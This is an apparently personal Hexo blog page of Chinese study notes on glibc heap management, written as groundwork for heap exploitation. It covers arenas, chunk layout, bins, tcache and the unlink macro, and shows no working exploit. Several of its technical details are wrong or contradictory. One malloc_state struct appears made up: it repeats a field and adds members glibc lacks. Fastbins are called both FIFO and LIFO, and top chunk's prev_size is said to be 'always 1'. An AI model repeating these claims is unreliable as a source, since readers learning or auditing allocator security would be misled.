@@ -1,0 +1,1211 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>alazymachine</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+<body>
+<header class="header">
+    <div class="header-inner">
+        <div class="header-title">
+
+        </div>
+        <nav class="header-nav">
+            
+            <a href="/" class="header-nav-link" >
+                首页
+            </a>
+            
+
+            
+            <a href="/archives" class="header-nav-link">
+                归档
+            </a>
+            
+
+            
+            <a href="/tags" class="header-nav-link">
+                标签
+            </a>
+            
+
+            
+        </nav>
+    </div>
+</header>
+<header class="mobile-header">
+    <div class="mobile-nav">
+        <div class="mobile-nav-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="mobile-nav-title">
+            <a href="/" class="mobile-nav-title-link">alazymachine's Blog</a>
+        </div>
+
+    </div>
+    <nav class="mobile-menu">
+        <ul class="mobile-menu-list">
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-home"></i>
+                <a href="/" class="mobile-nav-link">首页</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-archive"></i>
+                <a href="/archives" class="mobile-nav-link">归档</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-tag"></i>
+                <a href="/tags" class="mobile-nav-link">标签</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-about"></i>
+                <a href="/about/" class="mobile-nav-link">关于</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<div class="main">
+    <div class="content-inner">
+        <div class="posts">
+    
+        <article class="post-abstract">
+            <div class="post-title">
+                <h2><a class="post-title-link" href="/2023/05/12/heap-exp-heap-management/">HEAP-EXP-heap_management</a></h2>
+            </div>
+            <div class="post-meta">
+                <span class="post-time">2023-05-12</span>
+                
+            </div>
+            <div class="post-content">
+                
+                    <h1 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h1><hr>
+<p>​	本文用于介绍当前堆管理方式，堆溢出原理，常见的攻击方式及相关例题题解。</p>
+<h2 id="堆管理机制"><a href="#堆管理机制" class="headerlink" title="堆管理机制"></a>堆管理机制</h2><p>​	堆区域与栈区域在内存使用上存在不同：</p>
+<ul>
+<li>堆位于当前程序中较低的地址位置，栈位于当前程序中的较高内存空间位置</li>
+<li>堆在使用时从低地址内存向高地址内存增长，栈从高地址内存向低地址内存增长</li>
+<li><strong>堆和栈都可以是每个线程所有独有的，堆依然存在线程堆的概念</strong></li>
+</ul>
+<p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172015938.png" alt="先知社区https://xz.aliyun.com/t/10650"></p>
+<p>(上图中的共享库段中包含有不同权限的几个内存段，如下图所示，其中mapped区域是当前so文件代码段对应的heap段)</p>
+<p><img data-src="/HEAP-EXP-heap-management.assets/image-20230613200729790.png" alt="image-20230613200729790"></p>
+<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><ul>
+<li>32位下的text段是即时elf文件装入操作系统的起始位置0x8048000，也就是整个虚拟内存中用户可用的起始位置,最远的访问位置到0xbfffffff.</li>
+<li>64位下的内存起始位置在0x0000000000400000处，64位下总的内存大小为2的48次方，</li>
+</ul>
+<h4 id="内存的分配管理策略"><a href="#内存的分配管理策略" class="headerlink" title="内存的分配管理策略"></a>内存的分配管理策略</h4><ul>
+<li>具有较长生命周期的大内存使用mmap进行分配（例如说，在初始化给用户分配堆的过程）</li>
+<li>特别大的内存分配使用的是mmap，<strong>使用mmap申请的内存在释放后并不会放入bin，而是直接还给操作系统，因为这一部分内存块一般都比较大</strong></li>
+<li>短生命周期的内存分配使用brk，因为使用mmap分配的内存块需要多个物理页，浪费资源</li>
+<li>空闲小块是被管理，大内存块和长生命周期块都是直接回收返还给内存</li>
+<li>对于空闲的小内存块只会在malloc和free的时候进行合并，free后的空闲块可能放入pool中</li>
+<li><strong>注意一点，在程序运行初期会使用brk分配一个内存空间，该内存空间中的内容再被用户进行各种malloc的分配，该分配区域被称作为主分配区，由brk和sbrk两个指针限定边缘。如果当前的heap0中有合适的小内存块就直接分配，但是当使用free时，合并后的chunk大小大于64kb时才会将顶端的空闲内存返回给操作系统</strong></li>
+</ul>
+<h4 id="arena分配区机制"><a href="#arena分配区机制" class="headerlink" title="arena分配区机制"></a>arena分配区机制</h4><ul>
+<li>arena就是mmap heap1/heap2等，该分配区一旦产生就不能再减少。每个arena中都使用独立的bin机制来管理当前线程的内存块，<strong>但是如果是单线程程序也可以拥有多个arena</strong>，多个线程存在时，在malloc后可以使用其他线程的arena来分配内存：<ul>
+<li>首先循环遍历所有可用的 <em>arena</em>，在遍历的过程中，它会尝试加锁该 <em>arena</em>。如果成功加锁（该 <em>arena</em> 当前对应的线程并未使用堆内存则表示可加锁），比如将 <em>main arena</em> 成功锁住，那么就将 <em>main arena</em> 返回给用户，即表示该 <em>arena</em> 被子线程 3 共享使用。</li>
+<li>如果没能找到可用的 <em>arena</em>，那么就将子线程 3 的 <code>malloc</code> 操作阻塞，直到有可用的 <em>arena</em> 为止</li>
+<li>现在，如果子线程 3 再次调用 <code>malloc</code> 的话，<code>glibc</code> 的 <code>malloc</code> 就会先尝试使用最近访问的 <em>arena</em>（此时为 <em>main arena</em>）。如果此时 <em>main arena</em> 可用的话，就直接使用，否则就将子线程 3 阻塞，直到 <em>main arena</em> 再次可用为止。</li>
+</ul>
+</li>
+<li>在创建非主分配区时会先mmap创建分为一块较大的内存空间来模拟sub-heap（也就是类似主分配区的heap段），当然有heap就有top段的内容，topchunk是永远不会放在bin中的，因为top chunk总是在fast bin与bin之后被考虑。</li>
+<li>每个进程只能有一个主分配区，但有多个非主分配区<ul>
+<li>主分配区可以使用brk和mmap两种方式进行内存的分配</li>
+<li>非主分配区只能使用mmap的方式进行内存的分配，但与主分配区相同，都使用链表进行管理</li>
+<li>同样在多线程下，主线程能够使用主分配区，当然其他线程也可以，线程之间对于堆内存的访问是不存在限制的，因此其他线程也是能够释放主线程内存的，但是分配区存在锁机制，对分配区的操作要进行互斥。线程在使用内存时，只能通过先用mmap申请一块大内存（32位默认1MB，64位默认64MB）到用户空间，再使用malloc一点一点分配出去。这个mmap分出来的这块内存就是非主分配区，管理这块内存的就是arena</li>
+<li>可以看到一个线程只能有一个分配区（arena）但是一个arena可以管理多个堆块，主分配区域只需要管理一个堆块就可以了，就是使用brk分配的那个。</li>
+<li>多线程环境下内存的分配与回收：<ul>
+<li>查看当前线程下是否存在一个分配区，若存在一个分配区则尝试加锁，进行后续操作；如果加锁失败，则让分配器循环遍历arena，找到没有加锁的arena进行内存的分配操作；若所有的arena都在用，则使用malloc重新开辟一个新的内存空间，构造一个新的分配区；</li>
+<li>当进行内存的释放时，内存所在的分配区被加锁则等待，直到互斥锁被解开之后才能继续使用。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>进一步的，每个arena管理的heap可以抽象成一个在地址上连续的内存片段，内存片段被抽象为无数个chunk未被分配的chunk都视为top chunk，对于已经释放的free chunk部分则会使用一个双向链表进行管理，每次在分配时会遍历这个双向链表选择最合适的内存块，而管理各种不同的空闲块的管理器就是bin机制。</li>
+</ul>
+<h2 id="堆管理的数据结构"><a href="#堆管理的数据结构" class="headerlink" title="堆管理的数据结构"></a>堆管理的数据结构</h2><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>​	一个程序在运行时不只是存在一个主线程的heap，还会存在其他线程的heap（使用mmap申请的heap，使用该线程的arena进行管理），那么这些heap的信息需要使用一个heap_info 的结构进行管理，所以这部分的结构也叫作heap header。</p>
+<p>​	主线程的堆不是分配在内存映射区，而是进程的虚拟内存堆区，因此不含有多个 <em>heap</em> 所以也就不含有 <code>heap_info</code> 结构体。当需要更多堆空间的时候，直接通过增长 <code>brk</code> 指针来获取更多的空间，直到它碰到内存映射区域为止</p>
+<p>​	依照该数据结构的情况能够看到：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">heap_info</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">struct</span> <span class="token class-name">heap_info</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span>  <span class="token comment">//指向前一个heap_info结构</span>
+  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>  <span class="token comment">//当前heap_info结构所描述的堆内存大小</span>
+  <span class="token keyword">int</span> mmaped<span class="token punctuation">;</span>  <span class="token comment">//标记当前堆内存是否由mmap系统调用分配</span>
+  <span class="token keyword">struct</span> <span class="token class-name">heap_info</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>  <span class="token comment">//指向后一个heap_info结构</span>
+  <span class="token keyword">struct</span> <span class="token class-name">arena</span> <span class="token operator">*</span>ar_ptr<span class="token punctuation">;</span>  <span class="token comment">//指向当前堆内存所在的arena</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code> 用于表示 <em>arena</em> 的信息，因此也被称为 <em>arena header</em>，每个线程只含有一个 <em>arena header</em>。<em>arena header</em> 包含 <em>bin</em>、<em>top chunk</em> 以及 <em>last remainder chunk</em> 等信息</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token punctuation">{</span>
+  <span class="token class-name">binmap_t</span>     binmap<span class="token punctuation">[</span>BINMAPSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 用于标记哪些 bin 是非空的</span>
+  mfastbinptr  fastbinsY<span class="token punctuation">[</span>NFASTBINS<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 用于存放小块内存的链表</span>
+  mchunkptr    top<span class="token punctuation">;</span>  <span class="token comment">// 指向当前 arena 中最后一个已分配的 chunk</span>
+  mchunkptr    last_remainder<span class="token punctuation">;</span>  <span class="token comment">// 指向上一个 arena 中未被使用完的 chunk</span>
+  mchunkptr    bins<span class="token punctuation">[</span>NBINS <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 用于存放各个 bin 中的 chunk</span>
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>  <span class="token comment">// 指向下一个 malloc_state 结构</span>
+  <span class="token class-name">uint64_t</span>     magic<span class="token punctuation">;</span>  <span class="token comment">// 用于检查 malloc_state 结构的完整性</span>
+  <span class="token class-name">uint64_t</span>     flags<span class="token punctuation">;</span>  <span class="token comment">// 保存了 malloc_state 的各种状态信息</span>
+  <span class="token class-name">mutex_t</span>      mutex<span class="token punctuation">;</span>  <span class="token comment">// 用于保护 malloc_state 结构的互斥锁</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>       seg<span class="token punctuation">;</span>  <span class="token comment">// 指向当前 arena 的起始地址</span>
+  <span class="token class-name">size_t</span>       size<span class="token punctuation">;</span>  <span class="token comment">// 当前 arena 的大小</span>
+  <span class="token class-name">size_t</span>       mprotect_size<span class="token punctuation">;</span>  <span class="token comment">// 当前 arena 中已经保护的内存大小</span>
+  mchunkptr    mprotect_base<span class="token punctuation">;</span>  <span class="token comment">// 当前 arena 中已经保护的内存的起始地址</span>
+  mchunkptr    last_remainder<span class="token punctuation">;</span>  <span class="token comment">// 上一个 arena 中未被使用完的 chunk</span>
+  <span class="token keyword">struct</span> <span class="token class-name">heap_info</span> <span class="token operator">*</span>heap_info<span class="token punctuation">;</span>  <span class="token comment">// 当前 arena 所在的 heap_info 结构</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="chunk的组织形式"><a href="#chunk的组织形式" class="headerlink" title="chunk的组织形式"></a>chunk的组织形式</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">{</span>
+  <span class="token comment">/* #define INTERNAL_SIZE_T size_t */</span>
+  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment">/* 记录前一个chunk的大小，如果前一个chunk是free状态，此字段依然有用 ,而且该size的计算并不不包含前一个chunk的chunk头*/</span>
+  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment">/* 指向在bin中时前一个chunk和后一个chunk的位置，因此只有空闲状态的chunk使用 */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd<span class="token punctuation">;</span>    
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk<span class="token punctuation">;</span>
+	<span class="token comment">/* 上下这两个指针占用相同的空间 区别在于当前chunk是free的时候*/</span>
+  <span class="token comment">/* Only used for large blocks: pointer to next larger size.  */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment">/* double links -- used only if free. */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ul>
+<li>chunk在32位下的8字节对齐，在64位下的16字节对齐，因此allocater返回的chunk要比实际需要的稍大一些</li>
+<li>基本的chunk分配策略是首先在先前释放的chunk中找到合适的，如果没有择取heap区域的chunk</li>
+<li>如果上面的方法均不成功，则会去要求系统新分配一块内存mmap方法</li>
+</ul>
+<p><strong>已分配chunk的数据结构情况</strong></p>
+<p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016938.png" alt="image-20230613234305496"></p>
+<p><strong>未分配的chunk数据结构情况</strong></p>
+<p><img data-src="https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016286.png" alt="image-20230613234401273"></p>
+<p>​	在上面能够很明显的看到chunk在使用状态下原本存放fd和bk的位置会被直接用来存放用户数据。用户在使用malloc时返回的内存指针是指向chunk头后面的部分，在free后指向的fd的存放位置。</p>
+<p>​	这里的p是标志前一个chunk（地址更小的）是否处于被使用的状态，如果是则置位1，且prev_size有效（标志相邻的堆块大小，这里是指物理上相邻，主要用于进行内存块的合并操作，<strong>且prev_size的大小指的是包含当前块头部和用户数据的部分</strong>）</p>
+<pre class="line-numbers language-none"><code class="language-none">N：是不是「主分配区」分配的内存 1 表示不是主分配区分配的，0 表示是主分配区分配的
+
+M：是不是 Memory Mapped 分配的内存，1 表示是，0 表示是 heap
+
+P：表示前一个 chunk 是否在使用，在初始化的时候通常为 1，防止使用不能访问的内存<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3MTI2MS5odG1s">https://www.freebuf.com/articles/system/171261.html</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwMzc4ODY5OA==">https://blog.csdn.net/Breeze_CAT/article/details/103788698</span></p>
+<h3 id="tcache（thread-local-caching）机制"><a href="#tcache（thread-local-caching）机制" class="headerlink" title="tcache（thread local caching）机制"></a>tcache（thread local caching）机制</h3><ul>
+<li><code>tcache</code>属于一种缓存机制，它为每一个线程创建了一个缓存，从而实现了不加锁的堆块分配算法，起到了性能提升的作用。</li>
+<li>仅适用于glibc2.26以上的版本使用</li>
+</ul>
+<h3 id="Bin机制"><a href="#Bin机制" class="headerlink" title="Bin机制"></a>Bin机制</h3><ul>
+<li>ptmalloc 一共维护128个bin，使用数组存储链表头，</li>
+<li><strong>fast bin</strong>：fastbin是一些要被系统回收的较小的内存块，此类内存块使用一个<strong>单向链表</strong>进行存储，该bin中的所有chunk都不会被合并。内存分配时会先在fastbins中进行查找，随后才会在其他bin中进行查找。（chunksize &lt; maxsize时才会被放在fastbin中）采用先进先出标准进行管理。</li>
+<li><strong>small bin</strong>：专门存放size&lt;512的chunk，使用双向链表进行存储（也就是之前所说的拉链法存储），数组中的每个元素是chunk链的头，只有相同大小的bin能被存在一个链里，每个链之间相差8byte。共有62个循环双向链表。small bin与fast bin的某些大小是重合的，因此有些可以放入fastbin的块也可以在smallbin</li>
+<li><strong>large bin</strong>：需要对bin中的chunk按照大小进行排序。</li>
+<li><strong>unsorted bin</strong>：可以将其视为一个bin在回归其正确的所属bin之前的一个缓存，在释放一个不符合fast bin要求的chunk时会被先放入到unsorted bin中进行存储，同理，在进行chunk的切割后，剩余的某个部分是不合fast bin要求的则会将其放入unsorted bin中进行存储。与一般的bin不同之处在于，unsorted bin其本身只有一个。<ul>
+<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
+<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
+<li>fastchunk中的某些bin合并后大于fast bin的要求，那就先放入usorted bin等待后续的处理。</li>
+<li>unsorted bin在使用的过程中是FIFO的</li>
+</ul>
+</li>
+<li><strong>Top Chunk</strong>：Topchunk其实是在用户进行首次malloc时使用的内存，一部分给用户，一部分留给了Topchunk，当所有的bin都没有符合所需大小的时候，才会去动Top chunk，Top chunk的prevsize永远为1，否则前面的chunk就会被合并到Top Chunk中（也就是说链表中的前一个chunk始终不会被合并到top chunk中去），其实根据上面的过程不难发现，<strong>初始状态下的UNsorted chunk 就是 Top chunk</strong></li>
+<li>last reminder：其实就是经过malloc分配后切割出来的一块，这一块会放进unsorted bin中。</li>
+</ul>
+<h3 id="Bin运作流程"><a href="#Bin运作流程" class="headerlink" title="Bin运作流程"></a>Bin运作流程</h3><ul>
+<li>如果被用户释放的chunk大于max_fast，或者fast bins中的空闲chunk合并后，这些chunk首先会被放到unsorted bin队列中</li>
+<li>在进行malloc操作的时候，如果在fast bins中没有找到合适的chunk，则ptmalloc会先在unsorted bin中查找合适的空闲chunk，然后才查找bins。</li>
+<li>如果unsorted bin不能满足分配要求。malloc便会将unsorted bin中的chunk加入bins中。然后再从bins中继续进行查找和分配过程。</li>
+<li>unsorted bin可以看做是bins的一个缓冲区，增加它只是为了加快分配的速度。</li>
+<li>在size&gt;FASTBIM_CONNSOLIDATION_THRESHOLD,时(需要大chunk时)，ptmalloc会遍历fast bins中的chunk，将相邻的空闲chunk进行合并，并将合并后的chunk加入unsorted bin中，然后再将usorted bin里的chunk加入bins中。<br>Unsorted Bin</li>
+<li>空闲的chunk连入bin时,会将 P 设为 0 , 并检查前后chunk是否空闲,若空闲则合并后加入unsorted bins中</li>
+<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
+<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
+<li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</li>
+<li>分配过程：fastbin-&gt;unsorted bin-&gt;其他bins-&gt;切割top chunk</li>
+<li>回收过程：<ul>
+<li>在maped区域，直接回收即可</li>
+<li>在heap区域：首先检查当前堆块是否符合fastbin的要求，如果不符合就将其先放入到unsorted bin中等待后续的处理</li>
+</ul>
+</li>
+</ul>
+<h3 id="各个bin的处理先后顺序"><a href="#各个bin的处理先后顺序" class="headerlink" title="各个bin的处理先后顺序"></a>各个bin的处理先后顺序</h3><ul>
+<li>fastbin 是 LIFO (后入先出)</li>
+<li>unsorted bin是 FIFO (先进先出)</li>
+<li>small bin 是 FIFO</li>
+<li>large bin 是 FIFO</li>
+<li>tcache 是 LIFO</li>
+<li>实际利用时只要知道fastbin为了加快速度学习了栈的机制</li>
+</ul>
+<h3 id="线程堆"><a href="#线程堆" class="headerlink" title="线程堆"></a>线程堆</h3><ul>
+<li>每个线程在创建之初是会先申请一大块堆，使用heap_info结构对其进行记录，所有的heap通过单链表进行连接。一个线程可以有多个堆（其实就是初始分配的不够用），由于线程只能使用mmap，后续的堆要使用pre指针将heap_info进行连接。</li>
+</ul>
+<h3 id="malloc-state-1"><a href="#malloc-state-1" class="headerlink" title="malloc_state"></a>malloc_state</h3><ul>
+<li>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。</li>
+<li>无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。</li>
+</ul>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token punctuation">{</span>
+    <span class="token comment">/* Serialize access.  */</span>
+    <span class="token function">__libc_lock_define</span><span class="token punctuation">(</span><span class="token punctuation">,</span> mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Flags (formerly in max_fast).  */</span>
+    <span class="token keyword">int</span> flags<span class="token punctuation">;</span>
+
+    <span class="token comment">/* Fastbins */</span>
+    mfastbinptr fastbinsY<span class="token punctuation">[</span> NFASTBINS <span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
+    mchunkptr top<span class="token punctuation">;</span>
+
+    <span class="token comment">/* The remainder from the most recent split of a small request */</span>
+    mchunkptr last_remainder<span class="token punctuation">;</span>
+
+    <span class="token comment">/* Normal bins packed as described above */</span>
+    mchunkptr bins<span class="token punctuation">[</span> NBINS <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> binmap<span class="token punctuation">[</span> BINMAPSIZE <span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token comment">/* Linked list, points to the next arena */</span>
+    <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
+
+    <span class="token comment">/* Linked list for free arenas.  Access to this field is serialized
+       by free_list_lock in arena.c.  */</span>
+    <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next_free<span class="token punctuation">;</span>
+
+    <span class="token comment">/* Number of threads attached to this arena.  0 if the arena is on
+       the free list.  Access to this field is serialized by
+       free_list_lock in arena.c.  */</span>
+    INTERNAL_SIZE_T attached_threads<span class="token punctuation">;</span>
+
+    <span class="token comment">/* Memory allocated from the system in this arena.  */</span>
+    INTERNAL_SIZE_T system_mem<span class="token punctuation">;</span>
+    INTERNAL_SIZE_T max_system_mem<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="堆管理函数"><a href="#堆管理函数" class="headerlink" title="堆管理函数"></a>堆管理函数</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="libc_malloc"></a>libc_malloc</h3><p>​	malloc函数的本质是libc_malloc, 该函数其实也是对_int_malloc函数做一个封装操作。</p>
+<p><strong>用户申请的字节一旦进入libc_malloc会转换为无符号整数</strong>，同时在源码中能看到其中包含一个对于malloc_hook函数指针的调用，是便于用于进行自定义的malloc函数的编写。</p>
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><ul>
+<li>作用：将一个chunk从双向链表中取出来，其实就是解链操作，因此该函数的使用十分频繁。</li>
+<li>使用场景：<ul>
+<li><strong>malloc</strong><ul>
+<li>从恰好大小合适的 large bin 中获取 chunk。<ul>
+<li><strong>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</strong></li>
+<li><strong>依次遍历处理 unsorted bin 时也没有使用 unlink</strong> 。</li>
+</ul>
+</li>
+<li>从比请求的 chunk 所在的large bin 中取 chunk。</li>
+</ul>
+</li>
+<li><strong>free</strong><ul>
+<li>后向合并，合并物理相邻低地址空闲 chunk。</li>
+<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
+</ul>
+</li>
+<li><strong>malloc_consolidate</strong>：用于合并的时候要把空闲块取出来先。<ul>
+<li>后向合并，合并物理相邻低地址空闲 chunk。</li>
+<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
+</ul>
+</li>
+<li><strong>realloc</strong><ul>
+<li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Take a chunk off a bin list */</span>
+<span class="token comment">// unlink p</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">{</span>  </span><span class="token comment">//这里FD是前面的chunk，BK是后面的chunk,传入的BK和FD是空指针          \
+    // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span>
+	<span class="token comment">// 这两个位置分别是下一个chunk的prevsize和他自己记录的chunksize大小</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \
+      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               \
+    FD <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>                                                                      \
+    BK <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>                                                                      \
+    <span class="token comment">// 此处才真正的取出FD和BK两个chunk块</span>
+    <span class="token comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-&gt;</span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    \ <span class="token comment">// 看看取出的目标块是不是真正的目标</span>
+      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \
+    <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                                      \
+        FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>                                                              \
+        BK<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>   <span class="token comment">// 此处主要是将P排除在外，让前后块进行连接                 \
+        // 下面主要考虑 P 对应的 nextsize 双向链表的修改</span>
